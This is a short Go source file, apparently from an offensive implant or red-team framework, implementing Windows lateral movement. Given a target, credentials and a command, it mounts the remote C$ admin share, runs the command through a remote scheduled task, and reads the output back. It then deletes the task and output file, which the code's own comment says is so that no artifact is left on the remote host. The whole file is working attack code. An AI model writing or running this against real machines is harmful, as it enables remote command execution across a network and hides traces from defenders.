//go:build windows
// +build windows

package main

import (
	"fmt"
	"strconv"
	"time"
)

func lateralPsexec(target, user, pass, cmd string) (string, error) {
	if cmd == "" {
		cmd = "whoami"
	}
	schName := "ForgeLateral" + strconv.Itoa(int(time.Now().Unix()%10000))
	outName := "fl_" + strconv.Itoa(int(time.Now().UnixNano()%1000000000)) + ".txt"
	outLocal := `C:\Windows\Temp\` + outName
	outRemote := `\\` + target + `\C$\Windows\Temp\` + outName

	var script string
	if user != "" {
		// Keep the password out of the process argv by writing the net-use
		// invocation into the script file (run via runCmdScriptFile).
		script += fmt.Sprintf(`net use \\%s\C$ /user:%s %s`+"\r\n", target, user, pass)
	}
	// Run the command remotely via a scheduled task and capture its output to a
	// file on the target, then read it back over the admin share.
	script += fmt.Sprintf(`schtasks /s %s /create /tn %s /tr "cmd.exe /c %s > %s 2>&1" /sc once /st 00:00 /f`+"\r\n", target, schName, cmd, outLocal)
	script += fmt.Sprintf(`schtasks /s %s /run /tn %s`+"\r\n", target, schName)
	script += fmt.Sprintf(`timeout /t 3 /nobreak >nul & type %s`+"\r\n", outRemote)
	// Cleanup: remove the scheduled task and the output file so no artifact is
	// left on the remote host.
	script += fmt.Sprintf(`schtasks /s %s /delete /tn %s /f`+"\r\n", target, schName)
	script += fmt.Sprintf(`del /f /q %s`+"\r\n", outRemote)

	res, err := runCmdScriptFile(script)
	// Best-effort cleanup in case the script was interrupted before reaching it.
	cleanup := fmt.Sprintf(`schtasks /s %s /delete /tn %s /f & del /f /q %s`, target, schName, outRemote)
	runCmdScriptFile(cleanup)
	return res, err
}
